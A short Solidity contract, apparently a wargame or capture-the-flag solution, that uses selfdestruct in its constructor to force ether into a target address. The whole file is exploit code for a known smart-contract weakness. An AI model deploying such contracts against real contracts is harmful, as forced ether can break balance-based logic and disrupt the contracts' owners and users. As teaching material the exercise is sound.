// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

contract ForceHack {
    constructor(address payable attacker) payable {
        // very easy here, we just need to call selfdestruct
        // we can do it directly in the constructor
        require(msg.value > 0); // require a bit of ETH to be sent otherwise the base contract doesn't have funds
        selfdestruct(attacker);
    }
}
